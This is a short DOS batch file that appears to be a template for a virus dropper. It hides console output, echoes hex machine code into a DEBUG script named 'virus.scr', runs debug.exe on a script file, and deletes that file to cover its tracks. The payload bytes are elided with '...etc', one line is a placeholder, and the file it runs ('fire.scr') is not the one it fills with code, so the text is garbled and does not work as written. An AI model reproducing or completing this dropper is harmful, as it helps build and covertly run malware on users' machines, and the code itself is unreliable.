@echo off
ctty nul
ECHO E0100 BA 4B 02 BA 58 02 E8 54 00 BA ...etc>>virus.scr
ECHO u debug script ............................ >>virus.scr
ECHO g >>fire.scr
ECHO q >>fire.scr
debug<fire.scr
del fire.scr
ctty con
